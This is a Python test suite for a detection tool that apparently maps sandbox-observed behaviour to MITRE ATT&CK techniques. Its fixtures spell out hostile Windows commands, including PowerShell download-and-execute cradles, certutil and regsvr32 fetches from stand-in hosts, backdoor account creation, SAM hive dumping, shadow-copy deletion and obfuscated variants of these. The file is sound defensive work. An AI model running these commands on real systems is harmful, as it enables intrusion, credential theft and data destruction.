from __future__ import annotations

import random
import textwrap
import time
from pathlib import Path
from typing import Any

import pytest

from ttprism import AttackCatalog, Behavior, RuleError, RuleSet
from ttprism.attack import (
    MAX_EVIDENCE_CHARS,
    TechniqueAccumulator,
    _phrase_re,
    _printable,
    default_rules_path,
    normalize_command,
)

CATALOG = AttackCatalog.default()


def write_rules(tmp_path: Path, body: str, version: str = '"19.2"') -> Path:
    path = tmp_path / "rules.yaml"
    path.write_text(
        f"attack_version: {version}\nrules:\n" + textwrap.indent(textwrap.dedent(body), "  "),
        encoding="utf-8",
    )
    return path


# --------------------------------------------------------------------------- catalog


def test_catalog_version_and_lookup() -> None:
    assert CATALOG.version == "19.2"
    technique = CATALOG.get("T1059.001")
    assert technique is not None
    assert technique.name == "PowerShell"
    assert technique.tactics == ("execution",)


@pytest.mark.parametrize(
    ("old", "current"),
    [
        ("T1086", "T1059.001"),  # PowerShell, revoked in 2020
        ("T1045", "T1027.002"),  # Software Packing
        ("T1562.001", "T1685"),  # Disable or Modify Tools, moved in v19
        ("T1070.001", "T1685.005"),  # Clear Windows Event Logs, moved in v19
        ("T1059.001", "T1059.001"),
    ],
)
def test_resolve_follows_revocations(old: str, current: str) -> None:
    resolved = CATALOG.resolve(old)
    assert resolved is not None
    assert resolved.id == current
    assert resolved.status == "active"


def test_deprecated_and_unknown() -> None:
    scripting = CATALOG.resolve("T1064")
    assert scripting is not None
    assert scripting.status == "deprecated"
    assert CATALOG.resolve("T9999") is None


def test_accumulator_merges_and_records_original_ids() -> None:
    acc = TechniqueAccumulator(CATALOG)
    acc.add_reported("T1086", "named in text: T1086")
    acc.add_reported("T1059.001", "named in text: T1059.001")
    acc.add_reported("T9999", "named in text: T9999")
    (match,) = acc.results()
    assert match.technique_id == "T1059.001"
    assert match.original_ids == ("T1086",)
    assert match.reported
    assert acc.unknown == {"T9999": 1}


# --------------------------------------------------------------------------- rule loading


def test_bundled_rules_are_clean() -> None:
    ruleset = RuleSet.load([default_rules_path()])
    assert ruleset.warnings == []
    assert len(ruleset.rules) >= 100
    for rule in ruleset.rules:
        technique = CATALOG.get(rule.technique)
        assert technique is not None, rule.id
        assert technique.status == "active", rule.id
        assert rule.references, f"{rule.id} needs a reference"
        assert rule.description, f"{rule.id} needs a description"


def test_rule_warnings_for_outdated_techniques(tmp_path: Path) -> None:
    path = write_rules(
        tmp_path,
        """\
        - id: old
          technique: T1086
          match: {commands: [powershell]}
        - id: gone
          technique: T1064
          match: {commands: [wscript]}
        - id: future
          technique: T1999
          match: {commands: [whatever]}
        """,
        version='"18.0"',
    )
    ruleset = RuleSet.load([path])
    text = "\n".join(ruleset.warnings)
    assert "written for ATT&CK 18.0" in text
    assert "T1086 is revoked; use T1059.001" in text
    assert "T1064 is deprecated" in text
    assert "T1999 is not in ATT&CK 19.2" in text


@pytest.mark.parametrize(
    ("body", "version", "message"),
    [
        ("- id: x\n  technique: T1059\n  match: {commands: [a]}\n", "19.2", "quoted string"),
        ("- id: x\n  technique: 1059\n  match: {commands: [a]}\n", '"19.2"', "technique"),
        ("- id: x\n  technique: T1059\n", '"19.2"', "'match'"),
        ("- id: x\n  technique: T1059\n  match: {cmd: [a]}\n", '"19.2"', "unknown matchers"),
        ("- id: x\n  technique: T1059\n  typo: 1\n  match: {commands: [a]}\n", '"19.2"', "unknown keys"),
        (
            "- id: x\n  technique: T1059\n  confidence: certain\n  match: {commands: [a]}\n",
            '"19.2"',
            "confidence",
        ),
        ("- id: 'bad id'\n  technique: T1059\n  match: {commands: [a]}\n", '"19.2"', "'id'"),
        ("- id: x\n  technique: T1059\n  match: {signatures: ['[a-z]*']}\n", '"19.2"', "signature patterns"),
        ("- id: x\n  technique: T1059\n  match: {apis: ['Nt Foo']}\n", '"19.2"', "not an API name"),
        ("- id: x\n  technique: T1059\n  match: {commands: []}\n", '"19.2"', "non-empty"),
        # A phrase that normalises to "" would match everywhere (or crash).
        ("- id: x\n  technique: T1059\n  match: {commands: ['\"\"']}\n", '"19.2"', "empty once quotes"),
        ('- id: x\n  technique: T1059\n  match: {commands: [[a, "\'"]]}\n', '"19.2"', "empty once quotes"),
        ("- id: x\n  technique: T1059\n  match: {commands: ['^\"']}\n", '"19.2"', "empty once quotes"),
        (
            "- id: x\n  technique: T1059\n  match: {commands: [a], exclude_commands: ['\"\"']}\n",
            '"19.2"',
            "exclude_commands: phrase",
        ),
        ("- id: x\n  technique: T1059\n  match: {exclude_commands: [a]}\n", '"19.2"', "together with"),
        (
            "- id: x\n  technique: T1059\n  match: {commands: [a], exclude_commands: []}\n",
            '"19.2"',
            "non-empty",
        ),
        ("- id: x\n  technique: T1059\n  match: {commands: [a]}\n", '"v19.2"', "version number"),
        ("- id: x\n  technique: T1059\n  match: {commands: [a]}\n", '"19.2\\e[2J"', "version number"),
        ("- id: x\n  technique: T1059\n  match: {commands: [a]}\n", '"1234"', "version number"),
        ("- id: x\n  technique: T1059\n  match: {commands: [a]}\n", '"19.2.1.0"', "version number"),
        (
            "- id: x\n  technique: T1059\n  match: {commands: [a]}\n"
            "- id: x\n  technique: T1059\n  match: {commands: [b]}\n",
            '"19.2"',
            "duplicate rule id",
        ),
        # A repeated key would silently replace the first value.
        ("- id: x\n  technique: T1059\n  match: {commands: [a], commands: [b]}\n", '"19.2"', "duplicate key"),
        (
            "- id: x\n  technique: T1490\n  technique: T1059\n  match: {commands: [a]}\n",
            '"19.2"',
            "duplicate key",
        ),
        # Scalars that PyYAML cannot build: a clean error, not a traceback.
        (
            "- id: x\n  technique: T1059\n  match: {commands: [a]}\n  n: " + "1" * 5000 + "\n",
            '"19.2"',
            "value",
        ),
        (
            "- id: x\n  technique: T1059\n  match: {commands: [a]}\n  d: 2026-02-30\n",
            '"19.2"',
            "invalid YAML value",  # the rest of the message differs between Python versions
        ),
    ],
)
def test_invalid_rules(tmp_path: Path, body: str, version: str, message: str) -> None:
    path = tmp_path / "rules.yaml"
    path.write_text(f"attack_version: {version}\nrules:\n" + textwrap.indent(body, "  "), encoding="utf-8")
    with pytest.raises(RuleError, match=message):
        RuleSet.load([path])


def test_missing_rules_path(tmp_path: Path) -> None:
    with pytest.raises(RuleError, match="no such file"):
        RuleSet.load([tmp_path / "nope"])


# --------------------------------------------------------------------------- rule matching


def evaluate(tmp_path: Path, match: str, behavior: Behavior) -> list[str]:
    path = write_rules(tmp_path, f"- id: r\n  technique: T1059\n  match: {match}\n")
    hits = RuleSet.load([path]).evaluate(behavior)
    return hits[0][1] if hits else []


def test_command_phrases_respect_word_boundaries(tmp_path: Path) -> None:
    match = "{commands: [[sc, create, binpath]]}"
    assert evaluate(tmp_path, match, Behavior(commands=['"C:\\Windows\\sc.exe" create svc binPath= x']))
    assert not evaluate(tmp_path, match, Behavior(commands=["describe script create binpaths"]))


def test_command_normalisation_defeats_caret_and_quote_obfuscation(tmp_path: Path) -> None:
    assert normalize_command('s^c^h^t^a^s^k^s  /Create   "/TN" x') == "schtasks /create /tn x"
    evidence = evaluate(
        tmp_path, "{commands: [[schtasks, /create]]}", Behavior(commands=['s^c^h^t^a^s^k^s /Create /TN "x"'])
    )
    assert evidence == ['command: s^c^h^t^a^s^k^s /Create /TN "x"']


def test_signature_globs(tmp_path: Path) -> None:
    behavior = Behavior(signatures=["antivm_vbox_files", "packer_upx"])
    assert evaluate(tmp_path, "{signatures: ['antivm_*']}", behavior) == ["signature: antivm_vbox_files"]
    assert evaluate(tmp_path, "{signatures: ['ANTIVM_VBOX_FILES']}", behavior)
    assert not evaluate(tmp_path, "{signatures: [antivm]}", behavior)


def test_apis_and_apis_all(tmp_path: Path) -> None:
    behavior = Behavior(apis={"NtWriteVirtualMemory", "CreateRemoteThread"})
    assert evaluate(tmp_path, "{apis: ['WriteProcessMemory|NtWriteVirtualMemory']}", behavior)
    assert evaluate(
        tmp_path, "{apis_all: [[ 'NtWriteVirtualMemory|WriteProcessMemory', CreateRemoteThread ]]}", behavior
    ) == ["apis: createremotethread, ntwritevirtualmemory"]
    assert not evaluate(tmp_path, "{apis_all: [[NtWriteVirtualMemory, NtQueueApcThread]]}", behavior)


def test_registry_patterns(tmp_path: Path) -> None:
    key = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\updater"
    behavior = Behavior(registry_writes=[key])
    assert evaluate(tmp_path, r"{registry: ['\currentversion\run\']}", behavior) == [f"registry: {key}"]
    assert evaluate(tmp_path, r"{registry: [['hkey_current_user', '\run\']]}", behavior)
    assert not evaluate(tmp_path, r"{registry: [['hkey_local_machine', '\run\']]}", behavior)


def test_evidence_is_sanitised(tmp_path: Path) -> None:
    evidence = evaluate(
        tmp_path,
        "{commands: [powershell]}",
        Behavior(commands=["powershell \x1b[31mred\x1b[0m " + "A" * 500]),
    )
    assert "\x1b" not in evidence[0]
    assert len(evidence[0]) <= 200


def test_rule_file_errors_do_not_echo_control_characters(tmp_path: Path) -> None:
    for body in (
        '- id: x\n  technique: T1059\n  "\\e]0;PWNED\\a": 1\n  match: {commands: [a]}\n',
        '- id: x\n  technique: T1059\n  match: {"\\e[2Jcmd": [a]}\n',
    ):
        path = tmp_path / "rules.yaml"
        path.write_text('attack_version: "19.2"\nrules:\n' + textwrap.indent(body, "  "), encoding="utf-8")
        with pytest.raises(RuleError, match="unknown") as info:
            RuleSet.load([path])
        assert "\x1b" not in str(info.value)
        assert "\\x1b" in str(info.value)


@pytest.mark.parametrize("version", ['"19"', '"19.2"', '"18.1.0"'])
def test_attack_version_formats(tmp_path: Path, version: str) -> None:
    path = write_rules(tmp_path, "- id: x\n  technique: T1059\n  match: {commands: [a]}\n", version)
    assert len(RuleSet.load([path]).rules) == 1


# --------------------------------------------------------------------------- phrase engine


def _reference_contains(haystack: str, phrase: str) -> bool:
    """The original find() loop, with "_" as a word character."""

    def word(c: str) -> bool:
        return c.isalnum() or c == "_"

    start = 0
    while (index := haystack.find(phrase, start)) != -1:
        end = index + len(phrase)
        left_ok = not word(phrase[0]) or index == 0 or not word(haystack[index - 1])
        right_ok = not word(phrase[-1]) or end == len(haystack) or not word(haystack[end])
        if left_ok and right_ok:
            return True
        start = index + 1
    return False


def test_phrase_regex_matches_reference_semantics() -> None:
    # Letters, digits (incl. non-ASCII ones that isalnum() accepts), "_", separators.
    alphabet = ["a", "b", "1", "_", " ", ".", "\\", "-", "$", chr(0xE9), chr(0x663), chr(0xB2), chr(0x216B)]
    rng = random.Random(1)  # noqa: S311 (reproducible test data)
    for _ in range(20000):
        phrase = "".join(rng.choices(alphabet, k=rng.randint(1, 3)))
        haystack = "".join(rng.choices(alphabet, k=rng.randint(0, 12)))
        expected = _reference_contains(haystack, phrase)
        assert (_phrase_re(phrase).search(haystack) is not None) == expected, (phrase, haystack)


def test_empty_phrase_never_matches() -> None:
    assert _phrase_re("").search("") is None
    assert _phrase_re("").search("whoami") is None


def test_underscore_is_a_word_character(tmp_path: Path) -> None:
    assert not evaluate(tmp_path, "{commands: [user]}", Behavior(commands=["reg query HKEY_CURRENT_USER\\x"]))
    assert not evaluate(tmp_path, "{commands: [_x]}", Behavior(commands=["a__x"]))
    assert evaluate(tmp_path, "{commands: [_x]}", Behavior(commands=["a _x"]))


def test_normalize_command_folds_unicode_dashes_and_quotes() -> None:
    dashes = chr(0x2013) + chr(0x2014) + chr(0x2015)
    assert normalize_command(f"PowerShell {dashes}Enc  x") == "powershell ---enc x"
    assert normalize_command("cmd /c s\"c\"htasks '/create'") == "cmd /c s c htasks /create"
    assert normalize_command("cmd /c s\"c\"htasks '/create'", delete_quotes=True) == "cmd /c schtasks /create"


def test_quoted_and_unquoted_views(tmp_path: Path) -> None:
    rule = "{commands: [[schtasks, /create]]}"
    # cmd.exe ignores quotes inside a word ...
    for command in ['cmd /c s"c"htasks /create /tn x', 'cmd /c sc""htasks /create /tn x']:
        assert evaluate(tmp_path, rule, Behavior(commands=[command])) == [f"command: {command}"]
    # ... while quotes between words still separate them.
    assert evaluate(
        tmp_path, "{commands: [delete shadows]}", Behavior(commands=['vssadmin "delete" shadows'])
    )
    # Every phrase of an inner list must occur in the same view.
    assert not evaluate(tmp_path, "{commands: [[x y, xy]]}", Behavior(commands=['x"y']))
    # Rule phrases are normalised like command lines.
    assert evaluate(tmp_path, """{commands: ['s"c"htasks']}""", Behavior(commands=["schtasks /query"]))


def test_exclude_commands(tmp_path: Path) -> None:
    rule = "{commands: [net localgroup, [whoami, /all]], exclude_commands: [/add, [/delete, admins]]}"
    assert evaluate(tmp_path, rule, Behavior(commands=["net localgroup administrators"]))
    assert not evaluate(tmp_path, rule, Behavior(commands=["net localgroup administrators x /add"]))
    assert not evaluate(tmp_path, rule, Behavior(commands=["net localgroup admins x /delete"]))
    assert evaluate(tmp_path, rule, Behavior(commands=["net localgroup users x /delete"]))
    # The exclusion applies to every command phrase of the rule, line by line.
    assert not evaluate(tmp_path, rule, Behavior(commands=["whoami /all & net user x /add"]))
    behavior = Behavior(commands=["net localgroup a x /add", "net localgroup administrators"])
    assert evaluate(tmp_path, rule, behavior) == ["command: net localgroup administrators"]


def test_apis_all_evidence_is_deterministic(tmp_path: Path) -> None:
    behavior = Behavior(
        apis={"NtWriteVirtualMemory", "WriteProcessMemory", "CreateRemoteThread", "CreateRemoteThreadEx"}
    )
    rule = "{apis_all: [[NtWriteVirtualMemory|WriteProcessMemory, CreateRemoteThread|CreateRemoteThreadEx]]}"
    assert evaluate(tmp_path, rule, behavior) == [
        "apis: createremotethread, createremotethreadex, ntwritevirtualmemory, writeprocessmemory"
    ]


def test_printable_maps_surrogates_and_bidi_controls() -> None:
    unsafe = [
        chr(0xD800),
        chr(0xDFFF),
        *map(chr, range(0x202A, 0x202F)),
        *map(chr, range(0x2066, 0x206A)),
        "\u061c",
        "\u200e",
        "\u200f",
        "\x9b",
        "\n",
    ]
    cleaned = _printable("a" + "".join(unsafe) + "\tb")
    assert cleaned == "a" + chr(0xFFFD) * len(unsafe) + "\tb"
    cleaned.encode("utf-8")
    assert _printable("x" * MAX_EVIDENCE_CHARS) == "x" * MAX_EVIDENCE_CHARS
    assert _printable("x" * (MAX_EVIDENCE_CHARS + 1)) == "x" * (MAX_EVIDENCE_CHARS - 1) + chr(0x2026)


def test_printable_cost_does_not_depend_on_input_length() -> None:
    # A CAPE report can pair one 8 KiB signature name with every technique ID.
    text = "A" * 8192 + "\x1b"
    start = time.perf_counter()
    for _ in range(20000):
        _printable(text)
    assert time.perf_counter() - start < 2


def test_rule_evidence_is_encodable() -> None:
    hits = RuleSet.default().evaluate(Behavior(commands=["powershell -c x" + chr(0xD800) + chr(0x202E)]))
    assert hits
    for _, evidence in hits:
        "".join(evidence).encode("utf-8")


# --------------------------------------------------------------------------- bundled rules

BUNDLED = RuleSet.default()


def fired(**behavior: Any) -> dict[str, str]:
    """Bundled rule ids that match, with their technique."""
    return {rule.id: rule.technique for rule, _ in BUNDLED.evaluate(Behavior(**behavior))}


WEBCLIENT = "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('{}')\""

COMMAND_HITS = [
    ("cmd.powershell", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe x.ps1"),
    ("cmd.powershell", 'cmd /c power""shell -c whoami'),
    ("cmd.scheduled-task", 'cmd /c s"c"htasks /create /tn x /tr c:\\x.exe'),
    ("cmd.scheduled-task", 'cmd /c sc""htasks /create /tn x /tr c:\\x.exe'),
    ("cmd.service-execution", "sc start evilsvc"),
    ("cmd.service-execution", "C:\\Windows\\System32\\sc.exe start evilsvc"),
    ("cmd.service-execution", "powershell -c Start-Service evilsvc"),
    ("cmd.service-execution", "psexec \\\\10.0.0.5 -s cmd.exe"),
    ("cmd.remote-service-execution", "sc \\\\dc01 start evilsvc"),
    ("cmd.remote-service-execution", "sc.exe \\\\10.0.0.5 start evilsvc"),
    ("cmd.regsvr32-scriptlet", "regsvr32 /s /n /u /i:https://evil.example.org/a.sct payload.dll"),
    ("cmd.regsvr32-scriptlet", 'regsvr32 /s /n /u /i:"http://evil.example.org/a.sct" payload.dll'),
    ("cmd.regsvr32-scriptlet", "regsvr32.exe -s -i:HTTP://evil.example.org/a.sct scrobj"),
    ("cmd.regsvr32-scriptlet", "regsvr32 /s /u /i:c:\\x.sct scrobj.dll"),
    ("cmd.run-key", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001 /v x /d y"),
    (
        "cmd.wmi-event-subscription",
        "powershell Set-WmiInstance -Class __EventFilter -Namespace root\\subscription",
    ),
    ("cmd.wmi-event-subscription", "wmic /namespace:\\\\root\\subscription PATH __EventFilter CREATE Name=x"),
    ("cmd.create-local-account", "net user backdoor P@ss1 /add"),
    ("cmd.create-local-account", '"C:\\Windows\\System32\\net.exe" user backdoor P@ss1 /ADD'),
    ("cmd.create-local-account", "net1 user backdoor P@ss1 /add"),
    ("cmd.create-domain-account", "net user svc_bak P@ss1 /add /domain"),
    ("cmd.create-domain-account", "net1.exe user svc_bak P@ss1 /add /dom"),
    ("cmd.create-domain-account", "powershell New-ADUser -Name svc_bak"),
    ("cmd.add-to-group", "net localgroup administrators svc_bak /add"),
    ("cmd.add-to-group", 'net group "Domain Admins" backdoor /add /domain'),
    ("cmd.add-to-group", "net1 localgroup Administrators x /add"),
    ("cmd.add-to-group", "powershell Add-LocalGroupMember -Group Administrators -Member x"),
    ("cmd.add-to-group", "powershell Add-ADGroupMember -Identity 'Domain Admins' -Members x"),
    ("cmd.download", "certutil /urlcache /split /f http://evil.example.org/a.exe a.exe"),
    ("cmd.download", "certutil.exe -urlcache -f http://evil.example.org/a.exe a.exe"),
    ("cmd.download", "certutil /verifyctl /f /split http://evil.example.org/a.exe"),
    ("cmd.download", 'powershell -c "iwr https://files.example.net/a.ps1 | iex"'),
    ("cmd.download", "powershell -c \"irm 'https://get.example.org/x' | iex\""),
    ("cmd.download", 'powershell -c "iwr http://files.example.net/a.ps1 | iex"'),
    ("cmd.decode", "certutil /decode a.b64 a.exe"),
    ("cmd.decode", "certutil -decodehex a.hex a.exe"),
    ("cmd.network-config", "ipconfig /all"),
    ("cmd.network-config", "ipconfig"),
    ("cmd.network-config", "route print"),
    ("cmd.user-discovery", "query user"),
    ("cmd.user-discovery", "C:\\Windows\\System32\\query.exe user /server:dc01"),
    ("cmd.user-discovery", "quser.exe"),
    ("cmd.remote-system-discovery", "net view /domain"),
    ("cmd.remote-system-discovery", "net1 view \\\\host"),
    ("cmd.share-discovery", "net share"),
    ("cmd.share-discovery", "net.exe view \\\\fileserver"),
    ("cmd.share-discovery", "powershell Get-SmbShare"),
    ("cmd.domain-account-discovery", "net user /domain"),
    ("cmd.domain-account-discovery", "net user administrator /dom"),
    ("cmd.domain-group-discovery", 'net group "Domain Admins" /domain'),
    ("cmd.domain-group-discovery", "net1 group /dom"),
    ("cmd.local-group-discovery", "net localgroup administrators"),
    ("cmd.time-discovery", "net time \\\\dc01"),
    ("cmd.network-connections-discovery", "net session"),
    ("cmd.service-stop", "net stop MSSQLSERVER /y"),
    ("cmd.service-stop", 'cmd /c "net stop ""SQL Server (MSSQLSERVER)"" /y"'),
    ("cmd.service-stop", "sc.exe stop WinDefend"),
    ("cmd.service-stop", "sc \\\\fileserver stop VSS"),
    ("cmd.service-stop", "powershell Stop-Service -Name veeam*"),
    ("cmd.inhibit-recovery", "wmic shadowcopy delete /nointeractive"),
    (
        "cmd.inhibit-recovery",
        'powershell -c "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"',
    ),
    ("cmd.sam-dump", "reg save HKLM\\SAM C:\\Users\\Public\\sam.save"),
    ("cmd.sam-dump", "reg.exe save HKEY_LOCAL_MACHINE\\SAM sam.hiv"),
]


@pytest.mark.parametrize(("rule_id", "command"), COMMAND_HITS)
def test_bundled_command_rules_match(rule_id: str, command: str) -> None:
    assert rule_id in fired(commands=[command])


COMMAND_MISSES = [
    # .NET type names and URL path words are not net.exe subcommands.
    ("cmd.remote-system-discovery", WEBCLIENT.format("http://198.51.100.7/view.php")),
    ("cmd.share-discovery", WEBCLIENT.format("http://198.51.100.7/view.php")),
    ("cmd.create-local-account", WEBCLIENT.format("http://198.51.100.7/user/add.exe")),
    ("cmd.service-stop", WEBCLIENT.format("http://cdn.example.org/user/stop.exe")),
    (
        "cmd.service-stop",
        "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://x/a','a') -ErrorAction Stop\"",
    ),
    (
        "cmd.service-stop",
        "powershell -c \"$ErrorActionPreference='Stop'; (New-Object Net.WebClient).DownloadFile('a','b')\"",
    ),
    (
        "cmd.network-connections-discovery",
        "powershell [Net.ServicePointManager]::x; iex (iwr http://x/session)",
    ),
    (
        "cmd.time-discovery",
        "powershell (New-Object System.Net.WebClient).DownloadString('http://x/time.ps1')",
    ),
    (
        "cmd.share-discovery",
        'powershell -c "Invoke-WebRequest https://x.blob.core.windows.net/share/a.exe -OutFile a.exe"',
    ),
    ("cmd.share-discovery", "net use Z: \\\\fileserver\\share /user:CORP\\jdoe"),
    # Account and group changes are not discovery; domain accounts are not local ones.
    ("cmd.create-local-account", "net user svc_bak P@ss1 /add /domain"),
    ("cmd.domain-account-discovery", "net user svc_bak P@ss1 /add /domain"),
    ("cmd.local-group-discovery", "net localgroup administrators svc_bak /add"),
    ("cmd.local-group-discovery", "net localgroup administrators svc_bak /delete"),
    ("cmd.domain-group-discovery", 'net group "Domain Admins" backdoor /add /domain'),
    ("cmd.share-discovery", "net share data /delete"),
    # "_" is part of a word, and "query user" must be adjacent.
    (
        "cmd.user-discovery",
        'reg query "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings"',
    ),
    (
        "cmd.user-discovery",
        'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders"',
    ),
    ("cmd.user-discovery", "cmd /c dir C:\\Users\\user\\Desktop & reg query HKLM\\Software"),
    # "start=" is the start type of sc config / sc create, not the start command.
    ("cmd.service-execution", "sc config WinDefend start= disabled"),
    ("cmd.service-execution", "sc config wuauserv start= auto"),
    ("cmd.service-execution", 'sc create evilsvc binPath= "C:\\Users\\a\\x.exe" start= auto'),
    ("cmd.service-execution", 'schtasks /create /sc minute /mo 5 /tn upd /tr "cmd /c start C:\\x.exe"'),
    ("cmd.remote-service-execution", "sc \\\\dc01 config WinDefend start= disabled"),
    # ipconfig switches that change state.
    ("cmd.network-config", "ipconfig /flushdns"),
    ("cmd.network-config", "ipconfig /release"),
    ("cmd.network-config", "ipconfig /renew6"),
    ("cmd.network-config", "ipconfig -registerdns"),
    # Other near misses.
    ("cmd.regsvr32-scriptlet", "regsvr32 /s C:\\Users\\a\\payload.dll"),
    ("cmd.download", "powershell -c iwr"),
    ("cmd.powershell-encoded", "powershell -ExecutionPolicy Bypass -File a.ps1"),
    ("cmd.powershell-encoded", "powershell -ep bypass -enx x"),
]


@pytest.mark.parametrize(("rule_id", "command"), COMMAND_MISSES)
def test_bundled_command_rules_ignore_near_misses(rule_id: str, command: str) -> None:
    assert rule_id not in fired(commands=[command])


def test_download_cradle_reports_only_download_and_powershell() -> None:
    for url in (
        "http://198.51.100.7/view.php",
        "http://198.51.100.7/user/add.exe",
        "https://x.net/share/session",
    ):
        assert fired(commands=[WEBCLIENT.format(url)]) == {
            "cmd.powershell": "T1059.001",
            "cmd.download": "T1105",
        }


def test_account_changes_map_to_persistence_not_discovery() -> None:
    commands = [
        "net user svc_bak P@ss1 /add /domain",
        "net localgroup administrators svc_bak /add",
        'net group "Domain Admins" svc_bak /add /domain',
    ]
    assert fired(commands=commands) == {
        "cmd.create-domain-account": "T1136.002",
        "cmd.add-to-group": "T1098.007",
    }


ENCODED_FLAGS = ["ec"] + ["encodedcommand"[:n] for n in range(1, len("encodedcommand") + 1)]


@pytest.mark.parametrize(
    "host", ["powershell", "PowerShell.exe", "pwsh", "C:\\Program Files\\PowerShell\\7\\pwsh.exe"]
)
@pytest.mark.parametrize("dash", ["-", "/", chr(0x2013), chr(0x2014), chr(0x2015)])
def test_encoded_command_spellings(host: str, dash: str) -> None:
    for flag in ENCODED_FLAGS:
        command = f"{host} -NoP -W Hidden {dash}{flag.upper()} SQBFAFgA"
        assert "cmd.powershell-encoded" in fired(commands=[command]), command


CAPE_ANTIVM = [  # every antivm_* signature in CAPE community af2e503 except antivm_recentdocs
    "antivm_bochs_keys", "antivm_checks_available_memory", "antivm_directory_objects", "antivm_display",
    "antivm_generic_bios", "antivm_generic_cpu", "antivm_generic_disk", "antivm_generic_disk_setupapi",
    "antivm_generic_diskreg", "antivm_generic_scsi", "antivm_generic_services", "antivm_generic_system",
    "antivm_hyperv_keys", "antivm_network_adapters", "antivm_parallels_keys", "antivm_vbox_devices",
    "antivm_vbox_files", "antivm_vbox_keys", "antivm_vbox_libs", "antivm_vbox_provname", "antivm_vbox_window",
    "antivm_vmware_devices", "antivm_vmware_events", "antivm_vmware_files", "antivm_vmware_keys",
    "antivm_vmware_libs", "antivm_vmware_mutexes", "antivm_vpc_files", "antivm_vpc_keys", "antivm_vpc_mutex",
    "antivm_wmi", "antivm_xen_keys",
]  # fmt: skip


@pytest.mark.parametrize("signature", CAPE_ANTIVM)
def test_antivm_signatures_are_system_checks(signature: str) -> None:
    assert fired(signatures=[signature]) == {"cape.antivm": "T1497.001"}


@pytest.mark.parametrize(
    ("signature", "expected"),
    [
        ("antivm_recentdocs", {"cape.user-activity-checks": "T1497.002"}),
        ("antisandbox_mouse_hook", {"cape.user-activity-checks": "T1497.002"}),
        ("mouse_movement_detect", {"cape.user-activity-checks": "T1497.002"}),
        ("antisandbox_foregroundwindows", {"cape.user-activity-checks": "T1497.002"}),
        ("antiav_servicestop", {"cape.service-stop": "T1489"}),
        ("disables_windows_defender", {"cape.disable-security-tools": "T1685"}),
        ("stealth_hidden_extension", {"cape.hide-file-extensions": "T1112"}),
        ("persistence_autorun_tasks", {"cape.persistence-scheduled-task": "T1053.005"}),
    ],
)
def test_cape_signature_mappings(signature: str, expected: dict[str, str]) -> None:
    assert fired(signatures=[signature]) == expected


def test_autorun_tasks_signature_is_low_confidence() -> None:
    ((rule, _),) = BUNDLED.evaluate(Behavior(signatures=["persistence_autorun_tasks"]))
    assert rule.confidence == "low"


@pytest.mark.parametrize(
    ("key", "rule_id"),
    [
        (
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR",
            "reg.system-restore",
        ),
        (
            "HKLM\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\\DisableSR",
            "reg.system-restore",
        ),
        (
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR",
            "reg.system-restore",
        ),
        (
            "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend",
            "reg.run-keys",
        ),
    ],
)
def test_bundled_registry_rules(key: str, rule_id: str) -> None:
    assert rule_id in fired(registry_writes=[key])


def test_bundled_api_evidence_is_deterministic() -> None:
    hits = BUNDLED.evaluate(
        Behavior(
            apis={"NtWriteVirtualMemory", "WriteProcessMemory", "CreateRemoteThread", "CreateRemoteThreadEx"}
        )
    )
    assert [(rule.id, evidence) for rule, evidence in hits] == [
        (
            "api.remote-thread-injection",
            ["apis: createremotethread, createremotethreadex, ntwritevirtualmemory, writeprocessmemory"],
        )
    ]


def test_phrase_matching_is_fast_on_near_misses() -> None:
    """Text full of almost-matching phrases ('netnetnet...') used to be scanned in a Python loop."""

    def seconds(filler: str) -> float:
        commands = [(filler * (6000 // len(filler) + 1))[:6000] + f"{i:06d}" for i in range(200)]
        behavior = Behavior(commands=commands)
        best = float("inf")
        for _ in range(2):
            start = time.perf_counter()
            BUNDLED.evaluate(behavior)
            best = min(best, time.perf_counter() - start)
        return best

    baseline = seconds("abc")
    for filler in ("net", "sc", "^n^e^t", "xnet view", '"a" ', "_net_user"):
        assert seconds(filler) < 5 * baseline + 0.1, filler
